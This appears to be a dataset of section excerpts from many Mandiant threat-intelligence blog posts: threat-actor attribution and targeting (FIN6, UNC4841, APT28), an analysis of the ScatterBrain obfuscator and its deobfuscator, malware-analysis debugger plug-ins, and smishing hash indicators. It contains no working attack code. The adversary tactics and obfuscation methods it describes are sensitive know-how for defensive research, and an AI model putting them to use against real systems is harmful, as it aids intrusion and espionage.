applications (MITRE T1190). \nBridging the Gap: Elevating Red Team Assessments with Application Security Testing | Google Cloud Blog Figure 1: Initial Compromise statistics from the M-Trends report \nAt Mandiant, we recognize this gap and are committed to closing it by integrating AppSec expertise into our Red Team assessments. This optional approach is offered to customers who wish to increase the coverage of their external perimeters to gain a deeper understanding of their security posture. While most of the infrastructure typically receive a considerable amount of security scrutiny, web applications and edge devices often lack the same level of consideration, making them prime targets for attackers. \nThis integrated approach is not limited to full-scope Red Team engagements. Organizations with varying maturity levels can also leverage application security expertise within the context of focused external perimeter assessments. These assessments provide a valuable and cost-effective way to gain insights into the security of internet-facing applications and systems, without the need for a Red Team exercise. ", "source": "mandiant"}, {"title": "Conclusion", "content": "As this blog post demonstrated, the integration of application security expertise into Red Team assessments yields significant benefits for organizations seeking to understand and strengthen their security posture. By proactively identifying and addressing vulnerabilities across the entire attack surface, including those commonly overlooked by traditional approaches, businesses can minimize the risk of breaches, protect critical assets, and hopefully avoid the financial and reputational damage associated with successful attacks. \nThis integrated approach is not limited to Red Team engagements. Organizations with varying maturity levels can also leverage application security expertise within the context of focused external perimeter assessments. These assessments provide a valuable and cost-effective way to gain insights into the security of internet-facing applications and systems, without the need for a Red Team exercise. \nWhether through a comprehensive Red Team engagement or a targeted external assessment, incorporating application security expertise enables organizations to better simulate the tactics and techniques of modern adversaries. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Part Two of this blog series presents multiple vulnerabilities in Windows' built-in image parsers. In the next post, we will explore newer supported image formats in Windows such as RAW, HEIF and more. \nPosted in Threat Intelligence-Security & Identity \nRelated articles ", "source": "mandiant"}, {"title": "Attribution", "content": "FIN6 has traditionally conducted intrusions targeting payment card data from Point-of-Sale (POS) or eCommerce systems. This incident's targeting of the engineering industry would be inconsistent with that objective. However, we have recently identified multiple targeted Ryuk and LockerGoga ransomware incidents showing ties to FIN6, through both Mandiant incident response investigations and FireEye Intelligence research into threats impacting other organizations. We have traced these intrusions back to July 2018, and they have reportedly cost victims tens of millions of dollars. As the frequency of these intrusions deploying ransomware have increased, the cadence of activity traditionally attributed to FIN6-intrusions targeting point-of-sale (POS) environments, deploying TRINITY malware and sharing other key characteristics-has declined. Given that, FIN6 may have evolved as a whole to focus on these extortive intrusions. However, based on tactical differences between these ransomware incidents and historical FIN6 activity, it is also possible that some FIN6 operators have been carrying out ransomware deployment intrusions independently of the group's payment card breaches. Which of those scenarios is happening would influence how pressing a threat the group's card data breach tactics continue to be. Criminal operations and relationships are highly adaptable, so we commonly encounter such attribution challenges in regards to criminal activity. Given that these intrusions have been sustained for almost a year, we expect that continued research into further intrusion attempts may enable us to more fully answer these questions regarding FIN6's current status. ", "source": "mandiant"}, {"title": "Appendix", "content": "The following table consists of hex values at offset 0 in the TriStation UDP packets and the associated dictionary definitions, extracted verbatim from the TRITON framework in library TS_cnames.pyc. \nTotally Tubular Treatise on TRITON and TriStation | Mandiant | Google Cloud Blo ", "source": "mandiant"}, {"title": "Appendix", "content": "The following table consists of hex values at offset 6 in the TriStation UDP packets and the associated dictionary definitions, extracted verbatim from the TRITON framework in library TS_cnames.pyc. \nTotally Tubular Treatise on TRITON and TriStation | Mandiant | Google Cloud Blo \nTotally Tubular Treatise on TRITON and TriStation | Mandiant | Google Cloud Blo \nTotally Tubular Treatise on TRITON and TriStation | Mandiant | Google Cloud Blo Totally Tubular Treatise on TRITON and TriStation | Mandiant | Google Cloud Blog ", "source": "mandiant"}, {"title": "Conclusion", "content": "By making macos-unifiedlogs free and open source, we hope it will be useful for other forensic investigators when investigating macOS systems. \nmacOS Unified Logs | Challenges Related to the Unified Logs | Google Cloud Blog The source code, documentation, and limitations for macos-unifiedlogs is at Mandiant's GitHub. \nAdditional resources and background on the Unified Logs can be found at: \nApple Unified Logging and Activity Tracing formats GitHub page \nmacOS Unified log blog post from The Eclectic Light Company \nApple documentation on Logging \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "The combination of dynamic code loading, custom decryption, sophisticated obfuscation, and anti-debugging techniques creates a high likelihood of malicious activity. The incomplete understanding of the role of several custom functions further aggravates the risk. The app's behavior is heavily contingent on received data and time-sensitive factors, raising serious concerns about its potential for wide-ranging malicious acts. Immediate action should be taken to contain and investigate this application further. A detailed sandbox analysis is critical to identify any network communications, file system manipulation, or other abusive activities. \nAs seen in the Gemini output, the Android ELF behaviors are explained clearly on the functions matched on capa rules. \nIn this particular example, Gemini helped to: \nAccentuate the function call sequences to perform dynamic code loading, where our analysts can easily inspect the key function calls getCacheFilePath  and getDexClassLoader Identify the timezone extraction with the additional URL parameter hint, where our analysts may try to probe the malicious payload quickly and accurately Describe more potential suspicious behaviors (e.g. getDexClassLoader  JNI call, URL obfuscation) for further rule-writing ideas \ncapa rules in Android together with Gemini summarization shows great potential for further malware detection with more advanced techniques. Our analysts are closely monitoring the malware trends and techniques in the market and writing upto-date capa rules to catch the bad actors in the wild. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Smishing (SMS phishing) offers a unique vector to infect mobile users. The latest Smishing campaigns spreading in Europe show that Smishing is still a popular means for threat actors to distribute their malware. In addition, threat actors have been using diversified host schemes and different C2 servers, and have been continuously refining their malicious code to keep infecting more users and evade detection. \nTo protect against these threats, FireEye suggests that users not install apps from outside official app stores, and take caution before clicking any links where the origin is unclear. \nTo detect and defend against such attacks, we advise our customers to deploy our mobile security solution, FireEye MTP/MSM. This helps our clients gain visibility into threats in their user base, and also enables them to proactively hunt down devices that have been compromised. In addition, we advise our customers with NX appliances to ensure that Wi-Fi traffic is scanned by NX appliances to extend coverage to include mobile devices. \ndf53b59e354462cd0e704b7b21a750f7 6eb92667ebbbcb2c7ddf6230462222fd 3841abcef2b1b37aa7e2d47c535ca80e 265d37013e1ea39b868515cce157dfeb 49dac3b35afb2e8d3605c72d0d83f631 ffe98d97e7d827aa19abb968a528f3fe f4b8d64af0a53472901b50621f19d6bf e1d79608b649c22004ad7cc1cd049528 ef5c9b15755719597481c501f6b603ce 6a300ded487671ef39388b8d28927a83 d33b718737de5aa685672a2004e0fa3c d83d833092a4fa5ecc436d4246c2f7ce 97c2d04aa0f3c3b446fc228c1dbc4837 82b1006a5f45a6d2baf69544414ada81 9e9d9a3717eed4d558a3f5eddb260901 82d89319fabd998328cc6d4efc4db863 228a4b723bf3d8adc53a69dd0f36c746 e911df33f1d156b3309a4ac220c52070 2b90fca41272bec8b8ffefbb2456c001 40449a2ec48c3e630b2eb8c8089828cf 8d0a03981daa93210e184e7fff02883c fbdde37d41d12f21c049c570c9bda3de a18818cb3fb6f189560991cef6d1f929 bf7b72dbb2a9155dabc4eda31d273b92 9762441d52bdec725eff6f2f65e721e9 dba6b4bbf61e054fb978acaf70c3d849 93922ee5fbd149f31b0161deca76df77 035d1f3b7fb532a33de7a8445f9fa325 3f2017a5acb3e57801e2771341287001 06e74df867e9cb5c1bafc98165c6c248 20f4cd2baa09e0bd5e12dab50c0898cd af7a8d32865e8caf51a99c52834d4422 ", "source": "mandiant"}, {"title": "Background", "content": "A common technique used by malware is code injection. When malware allocates a memory region to inject code, the created region contains certain characteristics we use to identify them in a process's memory space. The injectfind plug-in finds and displays information about injected regions of memory from within WinDbg. \nThe injectfind plug-in is loosely based off the Volatility malfind plug-in. Given a memory dump, the Volatility variant searches memory for injected code and shows an analyst injected code found within processes. Instead of requiring a memory dump, the injectfind WinDbg plug-in runs in a debugger. Similar to malfind, the injectfind plug-in identifies memory regions that may have had code injected and prints a hex dump and a disassembly listing of each identified memory region. A quick glance at the output helps us identify injected code or hooked functions. The following section shows an example of an analyst identifying injected code with injectfind. ", "source": "mandiant"}, {"title": "Background", "content": "One feature missing from Windbg that is present in OllyDbg and x64dbg is the ability to set a breakpoint on an entire memory region. This type of breakpoint is known as a memory breakpoint. Memory breakpoints are used to pause a process when a specified region of memory is executed. \nMemory breakpoints are useful when you want to break on code execution without specifying a single address. For example, many packers unpack their code into a new memory region and begin executing somewhere in this new memory. Setting a memory breakpoint on the new memory region would pause the debugger at the first execution anywhere within the new memory region. This obviates the need to tediously reverse engineer the unpacking stub to identify the original entry point. \nOne way to implement memory breakpoints is by changing the memory protection for a memory region by adding the PAGE_GUARD memory protection flag. When this memory region is executed, a STATUS_GUARD_PAGE_VIOLATION exception occurs. The debugger handles the exception and returns control to the user. The flaredbg plug-in membreak uses this technique to implement memory breakpoints. ", "source": "mandiant"}, {"title": "Background", "content": "Malware often loads Windows library functions at runtime and stores the resolved addresses as global variables. Sometimes it is trivial to resolve these statically in IDA Pro, but other times this can be a tedious process. To speed up the labeling of these runtime imported functions, we created a plug-in named importfind to find these function addresses. Behind the scenes, the plug-in parses each library's export table and finds all exported function addresses. The plug-in then searches the malware's memory and identifies references to the library function addresses. Finally, it generates an IDAPython script that can be used to annotate an IDB workspace with the resolved library function names. ", "source": "mandiant"}, {"title": "Conclusion", "content": "This blog post shows the power of using the flaredbg plug-ins with a debugger to gain insight into how the malware operates at runtime. We saw how to identify injected code using the injectfind plug-in and create memory breakpoints using membreak. We also demonstrated the usefulness of the importfind plug-in for identifying and renaming runtime imported functions. \nTo find out how to setup and get started with flaredbg, head over the github project page where you'll learn about setup and usage. ", "source": "mandiant"}, {"title": "Targeting", "content": "Targeted organizations have spanned public and private sectors worldwide. A majority of exploitation activity appears to impact the Americas; however, that may partially reflect the product's customer base (Figure 4). \nAlmost a third of identified affected organizations were government agencies (Figure 5), supporting the assessment that the campaign had an espionage motivation. Further, in the set of entities selected for focused data exfiltration, shell scripts were uncovered that targeted email domains and users from ASEAN Ministry of Foreign Affairs (MFAs), as well as foreign trade offices and academic research organizations in Taiwan and Hong Kong. In addition, the actors searched for email accounts belonging to individuals working for a government with political or strategic interest to the PRC at the same time that this victim government was participating in high-level, diplomatic meetings with other countries. \nBased on the evidence available at the time of analysis, earliest compromises appear to have occurred on a small subset of appliances geolocated to mainland China. The C2 communications utilized during this early set of compromises also leveraged port 8080 while later compromises that occurred globally almost entirely leveraged port443 or port 25. ", "source": "mandiant"}, {"title": "Attribution", "content": "Mandiant assesses with high confidence that UNC4841 conducted espionage activity in support of the People's Republic of China. While Mandiant has not attributed this activity to a previously known threat group at this time, we have identified several \ninfrastructure and malware code overlaps that   \nprovide us with a high degree of confidence that this is a China-nexus espionage operation.   \nAdditionally, the targeting, both at the   \norganizational and individual account levels, focused on issues that are high policy priorities for the PRC, particularly in the Asia Pacific region including   \nTaiwan. ", "source": "mandiant"}, {"title": "Attribution", "content": "Mandiant assesses that some of this activity is UNC2652, a cluster of activity observed targeting diplomatic entities with phishing emails containing HTML attachments with malicious JavaScript, ultimately dropping a BEACON launcher. \nMandiant also assesses that some of this activity is UNC3004, a cluster of activity observed targeting both government and business entities through gaining access to Cloud Solution   \nProviders/Managed Service Providers to gain access to downstream customers. \nMicrosoft has previously reported on both UNC2652 and UNC3004 activity and links it to UNC2452, the group behind the SolarWinds compromise, under the name \"Nobelium\". While it is plausible that they are the same group, currently, Mandiant does not have enough evidence to make this determination with high confidence. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Unauthorized access to O365 tenant doesn't just pose a threat to an organization, but also to its staff and business partners. Organizations without enhanced security controls in O365 are at the greatest risk of experiencing a BEC. However, as multi factor-authentication becomes more and more commonplace, we've witnessed an increase of MFA bypass attempts performed by increasingly proficient attackers. \nIt's important to remember that social engineering plays a primary role throughout a BEC. Ensure that users are trained on how to identify credential harvesting forms, a common compromise vector. When in the midst of a BEC compromise, teams may want to promptly alert personnel in HR and financerelated roles to exercise extra caution when processing requests related to banking or wire transfers while the investigation is in progress. \nThe examples covered in this blog post are just a sample of what Managed Defense performs while investigating an Office 365 compromise. To take a proactive approach at preventing BECs, make sure the following best practices are implemented in a O365 tenant. Additionally, FireEye Email Security offers protections against phishing and the Helix platform's O365 ruleset can alert on anomalous activity as soon as it happens. ", "source": "mandiant"}, {"title": "Overview", "content": "In this blog post, we present our in-depth analysis of the ScatterBrain obfuscator, which has led to the development of a complete stand-alone static deobfuscator library independent of any binary analysis frameworks. Our analysis is based solely on the obfuscated samples we have successfully recovered, as we do not possess the obfuscating compiler itself. Despite this limitation, we have been able to comprehensively infer every aspect of the obfuscator and the necessary requirements to break it. Our analysis further reveals that ScatterBrain is continuously evolving, with incremental changes identified over time, highlighting its ongoing development. \nThis publication begins by exploring the fundamental primitives of ScatterBrain, outlining all its components and the challenges they present for analysis. We then detail the steps required to subvert and remove each protection mechanism, culminating in our deobfuscator. Our library takes protected binaries generated by ScatterBrain as input and produces fully functional deobfuscated binaries as output. \nBy detailing the inner workings of ScatterBrain and sharing our deobfuscator, we hope to provide valuable insights into developing effective countermeasures. Our blog post is intentionally exhaustive, drawing from our experience in dealing with obfuscation for clients, where we observed a significant lack of clarity in understanding modern obfuscation techniques. Similarly, analysts often struggle with understanding even relatively simplistic obfuscation methods primarily because standard binary analysis tooling is not designed to account for them. Therefore, our goal is to alleviate this burden and help enhance the collective understanding against commonly seen protection mechanisms. \nFor general questions about obfuscating compilers, we refer to our previous work on the topic, which provides an introduction and overview. ", "source": "mandiant"}, {"title": "Introduction", "content": "ScatterBrain is a sophisticated obfuscating compiler that integrates multiple operational modes and protection components to significantly complicate the analysis of the binaries it generates. Designed to render modern binary analysis frameworks and defender tools ineffective, ScatterBrain disrupts both static and dynamic analyses. \nProtection Modes: ScatterBrain operates in three distinct modes, each determining the overall structure and intensity of the applied protections. These modes allow the compiler to adapt its obfuscation strategies based on the specific requirements of the attack.   \nProtection Components: The compiler employs key protection components that include the following: \nSelective or Full Control Flow Graph (CFG) Obfuscation: This technique restructures the program's control flow, making it very difficult to analyze and create detection rules for. \nInstruction Mutations: ScatterBrain alters instructions to obscure their true functionality without changing the program's behavior. \nComplete Import Protection: ScatterBrain employs a complete protection of a binary's import table, making it extremely difficult to understand how the binary interacts with the underlying operating system. \nThese protection mechanisms collectively make it extremely challenging for analysts to deconstruct and understand the functionality of the obfuscated binaries. As a result, ScatterBrain poses a formidable obstacle for cybersecurity professionals attempting to dissect and mitigate the threats it generates. ", "source": "mandiant"}, {"title": "Introduction", "content": "We opted for a recursive-depth algorithm given the following reasons: \nNatural fit for code traversal: DFS allows us to infer function boundaries based solely on the flow of execution. It mirrors the way functions call other functions, making it intuitive to implement and reason about when reconstructing function boundaries. It also \nScatterBrain: Unmasking the Shadow of PoisonPlug's Obfuscator | Google Cloud Blog simplifies following the flow of loops and conditional branches. \nGuaranteed execution paths: We concentrate on code that is definitely executed. Given we have at least one known entry point into the obfuscated code, we know execution must pass through it in order to reach other parts of the code. While other parts of the code may be more indirectly invoked, this entry point serves as a foundational starting point. \nBy recursively exploring from this known entry, we will almost certainly encounter and identify virtually all code paths and functions during our traversal. \nAdapts to instruction mutations: We tailor the logic of the traversal with callbacks or \"rules\" that stipulate how we process each individual instruction. This helps us account for known instruction mutations and aids in stripping away the obfuscator's code. \nThe core data structures involved in this process are the following: CFGResult , CFGStepState , and RuleHandler : \nCFGResult : Container for the results of the CFG recovery process. It aggregates all pertinent information required to represent the CFG of a function within the binary, which it primarily consumes from CFGStepState . CFGStepState : Maintains the state throughout the CFG recovery process, particularly during the controlled-step traversal. It encapsulates all \nScatterBrain: Unmasking the Shadow of PoisonPlug's Obfuscator | Google Cloud Blog necessary information to manage the traversal state, track progress, and store intermediate results. \nRecovered cache: Stores instructions that have been recovered for a protected function without any additional cleanup or verification. This initial collection is essential for preserving the raw state of the instructions as they exist within the obfuscated binary before any normalization or validation processes are applied after. It is always the first pass of recovery. \nNormalized cache: The final pass in the CFG recovery process. It transforms the raw instructions stored in the recovered cache into a fully normalized CFG by removing all obfuscator-introduced instructions and ensuring the creation of valid, coherent functions. \nExploration stack: Manages the set of instruction addresses that are pending exploration during the DFS traversal for a protected function. It determines the order in which instructions are processed and utilizes a visited  set to ensure that each instruction is processed only once. \nObfuscator backbone: A mapping to preserve essential control flow links introduced by the obfuscator \nRuleHandler : Mutation rules are merely callbacks that adhere to a specific function signature and are invoked during each instruction step of the CFG recovery process. \nThey take as input the current protected binary, CFGStepState , and the current step-in instruction. Each rule contains specific logic designed to detect particular types of instruction characteristics introduced by the obfuscator. Based on the detection of these characteristics, the rules determine how the traversal should proceed. For instance, a rule might decide to continue traversal, skip certain instructions, or halt the process based on the nature of the mutation. \nThe following figure is an example of a rule that is used to detect the patched instruction dispatchers we introduced in the previous section and differentiating them from standard jmp instructions: \nThe remaining component is a routine that orchestrates the CFG recovery process for a given function address within the protected binary. It leverages the CFGStepState  to manage the DFS traversal and applies mutation rules to decode and recover instructions systematically. The result will be an aggregate of RecoveredInstr  instances that constitute the first pass of raw recovery: \nThe following Python code directly implements the algorithm outlined in Figure 33. It initializes the CFG stepping state and commences a DFS traversal starting from the function's entry address. During each step of the traversal, the current instruction \naddress is retrieved from the to_explore exploration stack and checked against the visited  set to prevent redundant processing. The instruction at the current address is then decoded, and a series of mutation rules are applied to handle any obfuscator-induced instruction modifications. Based on the outcomes of these rules, the traversal may continue, skip certain instructions, or halt entirely. \nRecovered instructions are appended to the recovered  cache, and their corresponding mappings are updated within the CFGStepState . The to_explore  stack is subsequently updated with the address of the next sequential instruction to ensure systematic traversal. This iterative process continues until all relevant instructions have been explored, culminating in a CFGResult  that encapsulates the fully recovered CFG. ", "source": "mandiant"}, {"title": "Overview", "content": "Rebuilding relocations is a critical step in restoring a deobfuscated binary to an executable state. This process involves adjusting memory references within the code so that all references point to the correct locations after the code has been moved or modified. On the x86-64 architecture, this primarily concerns instructions that use RIP-relative addressing, a mode where memory references are relative to the instruction pointer. \nRelocation is necessary when the layout of a binary changes, such as when code is inserted, removed, or shifted during deobfuscation. Given our deobfuscation approach extracts the original instructions from the obfuscator, we are required to relocate each recovered instruction appropriately into a new code segment. This ensures that the deobfuscated state preserves the validity of all memory references and that the accuracy of the original control and data flow is sustained. ", "source": "mandiant"}, {"title": "Conclusion", "content": "In this blog post, we delved into the sophisticated ScatterBrain obfuscator used by   \nPOISONPLUG.SHADOW, an advanced modular backdoor leveraged by specific China-nexus threat actors GTIG has been tracking since 2022. Our exploration of ScatterBrain highlighted the intricate challenges it poses for defenders. By systematically outlining and addressing each protection   \nmechanism, we demonstrated the significant effort required to create an effective deobfuscation   \nsolution. \nUltimately, we hope that our work provides valuable insights and practical tools for analysts and cybersecurity professionals. Our dedication to advancing methodologies and fostering collaborative innovation ensures that we remain at the forefront of combating sophisticated threats like \nPOISONPLUG.SHADOW. Through this exhaustive examination and the introduction of our deobfuscator, we contribute to the ongoing efforts to mitigate the risks posed by highly obfuscated malware, reinforcing the resilience of cybersecurity defenses against evolving adversarial tactics. ", "source": "mandiant"}, {"title": "Prevention", "content": "Mandiant advises all organizations to apply patches KB5003435 (CVE-2021-31207) and KB5001779 (CVE-2021-34473 and CVE-2021-34523) to vulnerable on-premises Microsoft Exchange servers to mitigate these vulnerabilities being exploited. To verify the current version of on-premises Microsoft Exchange running within an organization, reference this Microsoft resource. \nIf an organization is not able to immediately apply the patches, inbound TCP/80 and TCP/443 traffic to on-premises Exchange servers should be explicitly blocked from the Internet. \nAdditionally, Mandiant recommends organizations review their detection and response capabilities, especially on public-facing infrastructure, including: \nDeploying and configuring a File Integrity Monitoring solution to monitor and/or prevent the creation of files, especially on web servers outside of maintenance windows \nDeploying, configuring, and monitoring an   \nEndpoint Detection and Response solution to   \nalert to and respond to malicious activity   \neffectively   \nEnabling enhanced logging and implementing   \nsufficient log retention periods to support   \ninvestigations, including:   \nMicrosoft Systems Monitor (Sysmon) on Windows Servers   \nPowerShell Module, Script Block, and Transcription Logging ", "source": "mandiant"}, {"title": "Conclusion", "content": "In this blog post, we introduced a few different machine learning models that learn to annotate function names from PE malware disassembly. The proposed NMT models can be useful as either standalone disassembler plug-ins or as conditional components within Mandiant's scalable malware analysis pipelines. This work represents a collaboration between the MDS and FLARE teams, which together build predictive models to help find evil, automate expertise, and deliver intelligence as part of The Mandiant Advantage Platform. If you are interested in this mission, please consider applying to one of our job openings. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Although this attack did not leverage any zero-days or other advanced techniques, it was interesting to see how attackers used different components to perform reconnaissance activities on a specific target. \nThis attack also demonstrates that macro malware is effective even today. Users can protect themselves from such attacks by disabling Office macros in their settings and also by being more vigilant when enabling macros (especially when prompted) in documents, even if such documents are from seemingly trusted sources. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "Embedded Hardware Hacking 101 - The Belkin WeMo Link | Mandiant | Googl It is important to keep in mind the amount of attention paid to security is generally proportional to the value of the device. Implementing strict security features for a relatively inexpensive home automation system may not make sense for all but the most security-conscious consumer. That said, it is important to understand how easily an adversary can implement a malicious bootloader/firmware with a backdoor, allowing for command-and-control on devices we may rely on in our homes. A device as simple as a wireless light bulb can still be used as an entry point to our home systems. \nBy taking the previously outlined steps to analyze an embedded device, we successfully identified relevant chips, a UART debugging port, and how to read and write raw data to the accessible flash chip, affecting the boot process of the device. Following the previously defined steps will help you further investigate most embedded devices in order to identify vulnerabilities. \nUpon notifying Belkin of our intention to release this research, they provided the following statement: \n\"Wemo appreciates the work of FireEye and other white hat researchers who often play a critical role in identifying potential security issues and keeping connected devices safe for consumers. As malicious hackers grow more sophisticated, it is critical that we, and other smart home manufacturers, work with these groups to mitigate any serious threats to safety and security. \n\"Though Wemo is aware of the potential vulnerability published by FireEye in their recent blogpost, we do not believe it is serious enough to warrant what would be a major change to our hardware production. In order to facilitate this attack scenario, a hacker would have to have physical access to a Wemo Link device, tamper with its circuitry and then either return the hacked device or resell it, both of which are extremely unlikely. With this particular vulnerability, there is no remote or even local network threat to users, so we believe that the best way to prevent this is to always purchase new, unopened merchandise from an official Wemo dealer.\" \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Targeting", "content": "As the 12th largest economy in the world, Mexico draws attention from cyber espionage actors from multiple nations, with targeting patterns mirroring broader priorities and focus areas that we see elsewhere. Since 2020, cyber espionage groups from more than 10 countries have targeted users in Mexico; however, more than $77\\%$ of governmentbacked phishing activity is concentrated among groups from the People's Republic of China (PRC), North Korea, and Russia. \nThe examples here highlight recent and historical examples where cyber espionage actors have targeted users and organizations in Mexico. It should be noted that these campaigns describe targeting and do not indicate successful compromise or exploitation. ", "source": "mandiant"}, {"title": "Targeting", "content": "Since 2020, we have observed activity from seven cyber espionage groups with links to the PRC targeting users in Mexico, accounting for a third of government-backed phishing activity in the country. \nThis volume of PRC cyber espionage is similar to activity in other regions where Chinese government investment has been focused, such as countries within China's Belt and Road Initiative. In addition to activity targeting Gmail users, PRC-backed groups have targeted Mexican government agencies, higher education institutions, and news organizations. ", "source": "mandiant"}, {"title": "Targeting", "content": "Since 2020, North Korean cyber actors have accounted for approximately $18\\%$ of governmentbacked phishing activity targeting Mexico. Similar to their targeting interests in other regions, cryptocurrency and financial technology firms have been a particular focus. \nOne of the emerging trends we are witnessing globally from North Korea is the insider threat posed by North Korean nationals gaining employment surreptitiously at corporations to conduct work in various IT roles. We note the potential for this threat to present a future risk to Mexican enterprises given historical activity by North Korean threat actors in Mexico and the challenges associated with the expansive problem of North Korean actors attempting to gain employment in other countries. ", "source": "mandiant"}, {"title": "Targeting", "content": "Russian cyber espionage groups have targeted users in Mexico regularly for several years; however, since the start of Russia's war in Ukraine, Russian activity targeting Mexico has scaled back considerably-likely an indication of Russia's efforts to focus resources on Ukrainian and North Atlantic Treaty Organization (NATO) targets in the context of the Russia-Ukraine war. Of the four Russia-backed groups observed targeting Mexico, over $95\\%$ of the related phishing activity comes from one group, APT28 (aka FROZENLAKE). \nSince 2020, Russian cyber actors have accounted for approximately one-fifth of government-backed phishing activity targeting Mexico. However, in 2023 and 2024, Russian cyber actors only account for less than $1\\%$ of government-backed phishing activity targeting Mexico. ", "source": "mandiant"}, {"title": "Targeting", "content": "Cyber crime represents a common, moderateimpact threat to Mexico. Notably, we have observed \nInsights on Cyber Threats Targeting Users and Enterprises in Mexico | Google a variety of operations, including ransomware and extortion, targeting of banking credentials, cryptomining, and threat actors offering compromised access and/or credentials for sale. TAG continues to detect and disrupt multiple financially motivated groups targeting users and organizations in Mexico. Of these groups, three of the top four most frequently observed groups in the past year have been initial access brokers for extortion groups. Mandiant observed evidence of threat actors using a variety of initial access vectors, including phishing, malvertising, infected USB drives, and password spray. This initial access subsequently supported threat activity including ransomware and extortion operations, cryptomining, and threat actors offering compromised access and/or credentials for sale. \nLike other countries in the region, Mexico is affected by threat activity from actors primarily active in Latin America as well as operations with global reach. A significant amount of observed campaigns focus on stealing credentials for banking or other financial accounts, including use of banking trojans such as METAMORFO aka \"Horabot,\" BBtok, and JanelaRAT. Many threat actors in the Latin American underground appear to focus on simpler operations in which they can quickly and easily generate profits, such as payment card theft and fraud. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Mexico will remain an attractive target for threat actors driven by diverse motivations. Global cyber espionage actors from the PRC, North Korea, and Russia as well as multinational cyber criminals pose longstanding threats. To effectively safeguard Mexican enterprises and users, it is important to understand this unique interplay of threats and adopt a proactive approach to cybersecurity. \nWe hope the analysis and research here helps to inform defenders in Mexico, providing fresh insights for collective defense. At Google, we are committed to supporting the safety and security of online users everywhere and will continue to take action to \nInsights on Cyber Threats Targeting Users and Enterprises in Mexico | Google Cloud disrupt malicious activity to protect our users and enterprise customers and help make the internet safe for all. \nPosted in Threat Intelligence ", "source": "mandiant"}, {"title": "Conclusion", "content": "FakeNet-NG now brings the convenience of a modern, Python-based, malware-oriented network simulation tool to Linux, supporting the full complement of listeners that are available on FakeNet-NG for Windows. Users of REMnux can make use of FakeNet-NG already, while users of other Linux distributions can download and install it using standard package management tools. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "Despite the decline in activity, exploit kits still continue to put users at risk \u2013 especially those running older versions of software. Enterprises need to make sure their network nodes are fully patched. \nAll FireEye products detect the malware in our MVX engine. Additionally, FireEye Network Security blocks delivery at the infection point. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Commando VM was originally designed to be the de facto Windows machine for every penetration tester and red teamer. Now, with the addition of Kali Linux support, Docker and installation customization, we hope it will be the one machine for all penetration testers and red teamers. For a complete list of tools, and for the installation script, please see the Commando VM GitHub repository. We look forward to addressing user feedback, adding more tools and features, and creating many more enhancements for this Windows attack platform. ", "source": "mandiant"}, {"title": "Conclusion", "content": "These Excel functions are used frequently during investigations at FireEye Mandiant and are considered important forensic analysis techniques. The examples we give here are just a glimpse into the utility of LOOKUP functions and PivotTables. LOOKUP functions can be used to reference a multitude of data sources and can be applied in other situations during investigations such as tracking remediation and analysis efforts. \nPivotTables may be used in a variety of ways as well, depending on what data is available, and what sort of information is being analyzed to identify suspicious activity. Employing these techniques, alongside the ones we highlighted previously, on a consistent basis will go a long way in \"excelerating\" forensic analysis skills and efficiency. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Summary", "content": "AI already plays a critical role in how Mandiant processes and operationalizes threat intelligence today. Going forward, new LLM technologies will continue to expand those capabilities and supercharge our ability to leverage our rich set of intelligence to help customers stay ahead of emerging threats. By automating and optimizing various stages of the Threat Intelligence Lifecycle, organizations can augment the capabilities of their existing staff and make more informed decisions about their security strategy. Mandiant is at the forefront of this innovation, leveraging the power of AI and LLMs to provide organizations with the threat \n2025/5/7 10:46 \nAI and the Five Phases of the Threat Intelligence Lifecycle | Mandiant | Google Cloud Blog intelligence they need to better protect their assets and stay one step ahead of threat actors. \nTo learn more about how AI will further drive the personalization and usability of our Threat Intelligence, see the Introducing AI-powered insights in Threat Intelligence post. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "An understanding of past compromises and evolving threats is critical to guard against future attacks and help safeguard digital assets. As cryptocurrency and Web3 organizations expand, with platforms like Google Cloud for Web3 enabling innovation, they are frequently targeted, regardless of size, and there are typically earlier signs of compromise than the theft itself such as malware or suspicious logins. Organizations must evaluate their security posture and should consider leveraging advanced security solutions, such as Google Security Operations, to enable sufficient logging, alerting, and comprehensive incident response investigations to detect attacks and help prevent heists. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Fakenet-NG is the de facto standard network simulation tool for malware analysis. It runs without installation and is included in FLARE VM. In addition to its proven and tested default settings, Fakenet offers countless capabilities and configuration options. In this blog post we have presented several tricks to handle common analysis scenarios. To download the latest version, to see a complete list of all configuration options, or to contribute to Fakenet-NG, please see ourGithub repository. ", "source": "mandiant"}, {"title": "Targeting", "content": "In the two months since our introduction of UNC4841, Mandiant has also come to better understand UNC4841's targeting of ESG appliances and their primary targets based on their selectivity in follow-on operations. Overall, Mandiant has observed targeted organizations across public and private sectors worldwide appear to be impacted by UNC4841 tools. While the majority of exploitation activity appears to impact the Americas, that may partially reflect the product's customer base (Figure 13). \nOrganizations observed to be impacted by UNC4841 sit in a wide variety of verticals, with the primary targets including national governments, high tech and information technology entities, local governments, telecommunications providers, manufacturing entities, and colleges and universities. Twenty six specific verticals were observed that spanned a broad spectrum of functions (Figure 14). Noteworthy sectors that were included in minority targeted segments included \nhealthcare and biotechnology, public health, aerospace and defense, and semiconductors. \nAlmost a third of identified affected organizations were government agencies. As stated in Mandiant's earlier publication, shell scripts were uncovered that targeted email domains and users from ASEAN Ministry of Foreign Affairs, as well as foreign trade offices and academic research organizations in Taiwan and Hong Kong. In addition, the actors searched for email accounts belonging to employees of a government with political or strategic interest to the PRC while this victim government was participating in high-level, diplomatic meetings with other countries. This \nsuggests targeted exfiltration was prioritized for specific high value geopolitical and economic users. A distinct prioritization of government agencies alongside high tech and information technology targets was also observed when examining UNC4841 tools deployed following Barracuda's patching and initial disclosure of CVE-2023-2868. These factors support the assessment that the campaign had an espionage motivation. \nFollowing Barracuda's announcement 